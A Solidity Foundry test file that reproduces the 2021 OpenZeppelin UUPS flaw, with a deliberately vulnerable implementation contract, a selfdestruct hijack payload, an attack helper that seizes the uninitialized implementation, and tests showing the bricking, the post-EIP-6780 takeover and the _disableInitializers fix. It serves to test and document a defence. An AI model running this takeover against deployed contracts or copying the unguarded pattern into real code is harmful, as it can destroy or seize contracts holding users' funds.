// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC1967Utils} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";
import {Initializable} from "@openzeppelin/contracts/proxy/utils/Initializable.sol";
import {Test} from "forge-std/Test.sol";

/// @notice TEST-ONLY model of the UUPS pattern that OpenZeppelin fixed in Contracts 4.3.2 (advisory
///         GHSA-5vp3-v4hc-gx76, September 2021): the upgrade function works when called on the implementation
///         itself (no `onlyProxy`), and the constructor does not disable initializers.
contract UnguardedUUPSImpl is Initializable, OwnableUpgradeable {
    function initialize(address initialOwner) external initializer {
        __Ownable_init(initialOwner);
    }

    /// @dev Vulnerable: no `onlyProxy`. Called on the implementation, it rewrites the implementation's own
    ///      ERC-1967 slot and delegatecalls `data` in the implementation's context.
    function upgradeToAndCall(address newImplementation, bytes calldata data) external onlyOwner {
        ERC1967Utils.upgradeToAndCall(newImplementation, data);
    }

    function version() external pure returns (string memory) {
        return "unguarded";
    }
}

/// @notice The same implementation with the fix every implementation in `src/` applies.
contract FixedUUPSImpl is UnguardedUUPSImpl {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
}

/// @notice Attacker payload delegatecalled by the hijacked implementation.
contract HijackPayload {
    function destroy() external {
        // SELFDESTRUCT in the implementation's context: pre-Cancun it erases the implementation's code at the end
        // of the transaction. Written in assembly to document the opcode; the payload is test-only.
        assembly {
            selfdestruct(caller())
        }
    }
}

/// @notice Shared attack script: the attacker initializes the implementation contract, becomes its owner, then
///         calls `upgradeToAndCall` on the implementation to delegatecall a hijack payload.
abstract contract TakeoverBase is Test {
    address internal deployer = makeAddr("deployer");
    address internal attacker = makeAddr("attacker");

    function _deploy(address impl) internal returns (UnguardedUUPSImpl proxy) {
        proxy = UnguardedUUPSImpl(
            address(new ERC1967Proxy(impl, abi.encodeCall(UnguardedUUPSImpl.initialize, (deployer))))
        );
    }

    function _attack(address impl) internal {
        vm.prank(attacker);
        UnguardedUUPSImpl(impl).initialize(attacker);
        HijackPayload payload = new HijackPayload();
        vm.prank(attacker);
        UnguardedUUPSImpl(impl).upgradeToAndCall(address(payload), abi.encodeCall(HijackPayload.destroy, ()));
    }

    function _implementationOf(address proxy) internal view returns (address) {
        return address(uint160(uint256(vm.load(proxy, ERC1967Utils.IMPLEMENTATION_SLOT))));
    }
}

/// @notice Pre-Cancun semantics (the 2021 impact): the payload's SELFDESTRUCT deletes the shared implementation,
///         so every proxy pointing at it is bricked. The attack runs in `setUp` under Shanghai rules so that the
///         deletion is committed before the assertions run (SELFDESTRUCT takes effect at the end of a transaction).
contract PreCancunTakeoverTest is TakeoverBase {
    UnguardedUUPSImpl internal impl;
    UnguardedUUPSImpl internal proxyA;
    UnguardedUUPSImpl internal proxyB;

    function setUp() public {
        impl = new UnguardedUUPSImpl();
        proxyA = _deploy(address(impl));
        proxyB = _deploy(address(impl));
        assertEq(proxyA.version(), "unguarded");
        vm.setEvmVersion("shanghai");
        _attack(address(impl));
        vm.setEvmVersion("osaka");
    }

    function test_implementationCodeIsGone() public view {
        assertEq(address(impl).code.length, 0);
    }

    function test_everyProxyIsBrickedForGood() public {
        for (uint256 i; i < 2; ++i) {
            address proxy = i == 0 ? address(proxyA) : address(proxyB);
            (bool ok, bytes memory ret) = proxy.call(abi.encodeCall(UnguardedUUPSImpl.version, ()));
            assertTrue(ok, "a delegatecall into an empty account succeeds...");
            assertEq(ret.length, 0, "...and returns nothing");
            // The legitimate owner cannot repair it: the upgrade logic lived in the destroyed implementation.
            vm.prank(deployer);
            (ok, ret) = proxy.call(abi.encodeCall(UnguardedUUPSImpl.upgradeToAndCall, (address(this), "")));
            assertTrue(ok && ret.length == 0, "the upgrade call is a silent no-op");
            assertEq(_implementationOf(proxy), address(impl), "still pointing at the dead implementation");
        }
    }
}

/// @notice Osaka semantics (EIP-6780): SELFDESTRUCT outside the creation transaction no longer deletes code, so
///         the bricking primitive is gone, but the takeover itself still happens: the attacker owns the
///         implementation and ran arbitrary code in its context.
contract OsakaTakeoverTest is TakeoverBase {
    UnguardedUUPSImpl internal impl;
    UnguardedUUPSImpl internal proxy;

    function setUp() public {
        impl = new UnguardedUUPSImpl();
        proxy = _deploy(address(impl));
    }

    function test_attackerOwnsTheImplementationButCodeSurvives() public {
        _attack(address(impl));
        assertEq(impl.owner(), attacker, "attacker owns the implementation");
        assertGt(address(impl).code.length, 0, "EIP-6780: code survives");
        assertTrue(_implementationOf(address(impl)) != address(0), "attacker rewrote the implementation's own slot");
        assertEq(proxy.version(), "unguarded");
        assertEq(proxy.owner(), deployer);
    }
}

/// @notice The fix: `_disableInitializers()` in the constructor. The implementation can never be initialized, so
///         it never has an owner who could call its upgrade function.
contract DisableInitializersFixTest is TakeoverBase {
    function test_fixBlocksTheTakeover() public {
        FixedUUPSImpl impl = new FixedUUPSImpl();
        UnguardedUUPSImpl proxy = _deploy(address(impl));
        assertEq(proxy.owner(), deployer, "proxies still initialize normally");

        vm.expectRevert(Initializable.InvalidInitialization.selector);
        vm.prank(attacker);
        impl.initialize(attacker);

        HijackPayload payload = new HijackPayload();
        vm.expectRevert(abi.encodeWithSelector(OwnableUpgradeable.OwnableUnauthorizedAccount.selector, attacker));
        vm.prank(attacker);
        impl.upgradeToAndCall(address(payload), abi.encodeCall(HijackPayload.destroy, ()));
        assertEq(impl.owner(), address(0));
    }

    function test_fixKeepsProxyUpgradesWorking() public {
        FixedUUPSImpl impl = new FixedUUPSImpl();
        UnguardedUUPSImpl proxy = _deploy(address(impl));
        FixedUUPSImpl next = new FixedUUPSImpl();
        vm.prank(deployer);
        proxy.upgradeToAndCall(address(next), "");
        assertEq(_implementationOf(address(proxy)), address(next));
    }
}
